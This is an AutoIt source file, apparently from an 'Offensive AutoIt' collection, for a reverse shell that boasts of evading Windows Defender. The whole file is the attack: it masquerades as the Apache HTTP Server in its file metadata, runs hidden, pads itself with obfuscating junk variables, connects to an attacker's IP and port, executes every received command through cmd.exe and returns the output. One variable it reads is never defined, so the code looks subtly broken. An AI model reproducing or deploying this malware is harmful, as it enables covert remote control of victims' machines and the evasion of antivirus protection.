#cs ----------------------------------------------------------------------------

 Project:		 Offensive AutoIt
 Author:         vinix

 Script Function:

   This is a simple reverse shell that manages to avoid detection
   by Windows Defender (23/03/2022)

   Av Scan: https://antiscan.me/scan/new/result?id=m3hwPh2nQ4dC
   Result: (0/26)

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#pragma compile(Out, output.exe)
#pragma compile(UPX, False)
#pragma compile(FileDescription, Apache HTTP Server)
#pragma compile(ProductName, APACHE.EXE)
#pragma compile(ProductVersion, 1.0)
#pragma compile(FileVersion, 1.0)
#pragma compile(LegalCopyright, © Apache.)
#include <AutoItConstants.au3>

Global $Rpft1bPRvj4Uw__yT = Asc(StringMid("If 1 Then", 6, 1))
Global $var_1848 = Asc(StringMid("Switch $vNzrcqzfIfcrwkml", 21, 1))
Global $var_1382 = Asc(StringMid('Asc(StringMid("cZVqAcpeaX", 206 , 1))', 2, 1))
Global $w1D_PXRe_qGbj_S9gWWk = Asc(StringMid('Asc(StringRight("474hfsrDHJ", 1))', 6, 1))
Global Const $Oz94_j5_ZJ8yi_MA = Asc(StringMid('Asc(StringMid("yfX2hgE6QZ", 80 , 1))', 20, 1))
Global $var_1156 = Asc(StringMid("If 1692748845 = 1692748845 Then", 8, 1))
Global Const $g_vSdqqlciYwrthtfnvw = Asc(StringMid("Switch 669144269", 10, 1))
Global $g_tOglakJiiqbwtorzJpexvq = Asc(StringMid('Asc(StringMid("y2YgqBZLJE", 82 , 1))', 11, 1))
Global $OXZXIQSGV_VMECHO = Asc(StringMid("If 1 Then", 5, 1))
Global $uwEg_MGYg2_X3hR_NRcM_ss = Asc(StringMid('StringLen("2MZw5kYmse")', 2, 1))
Global $sUvennozmiZhnxmpgDhlxqjptt = Asc(StringMid("If 1 Then", 3, 1))
Global Const $var_3059 = Asc(StringMid("Switch 79452824", 2, 1))
Global $ZOGQCK_DVESC_NGWALCGDM = Asc(StringMid("While 1", 5, 1))
Global $var_505 = Asc(StringMid("Switch 228506168", 10, 1))
Global $GSQZATSSC = Asc(StringLeft("Until 1", 1))
Global $bLsiygcvGuhoynpreRqkdsdwdzm = Asc(StringMid("If 1 Then", 2, 1))
Global $zh_nZD_ffPO_9U_goNq3yh2dv = Asc(StringMid("If 567537815 = 567537815 Then", 9, 1))
Global Const $var_1797 = Asc(StringMid("Random(1, 483307074 + SRandom(163918900), 1)", 41, 1))
Global Const $gSVcWk__IegL_ORv1_XzO = Asc(StringMid("Chr(171)", 7, 1))
Global Const $OArd__tfV3fY_E2aQAZ7_o0 = Asc(StringMid("Switch $TAPIXRV", 12, 1))
Global $I3__aequ_i6_eRZsfz2t1K = Asc(StringMid('Asc(StringLeft("IxUbRXJ5sy", 1))', 16, 1))
Global Const $pHajvqizDtifxuVrrjbmikzt = Asc(StringMid("If 1878940512 = 1878940512 Then", 17, 1))
Global Const $var_1880 = Asc(StringMid("Until 1", 3, 1))
Global $var_1819 = Asc(StringMid('Asc(StringRight("y9esDHSCxh", 1))', 21, 1))
If $CMDLine[0] > 0 Then
    Start()
Else
    ConsoleWrite("Error! Use: " & @ScriptName & " <IP> <Port>")
EndIf
Func Start()
    TCPStartup()
    Local $DOS
    Local $uWmAuAO_FUYW_nu__6kkEg = ''
    Local $sLquit = $WSVLV_LLSLC_VMIXR[1]
    Local $JKPOTZV_MVBVPJ = $WSVLV_LLSLC_VMIXR[2]
    Local $var_3306 = TCPConnect($sLquit, $JKPOTZV_MVBVPJ)
    If @error Then
        Local $tPkwxnmg = @error
        ConsoleWrite("Connection refused.")
        Return False
    Else
        While (1)
            $KSDDNMUXSJ_SRMZJB_PCXGPVUWLM = TCPRecv($var_3306, 2048)
            $DOS = Run(@ComSpec & " /c " & $KSDDNMUXSJ_SRMZJB_PCXGPVUWLM & "", "", @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
            ProcessWaitClose($DOS)
            $J_vQXPYApEurxhJY_L_2 = StdoutRead($DOS)
            TCPSend($var_3306, $J_vQXPYApEurxhJY_L_2)
        WEnd
    EndIf
EndFunc
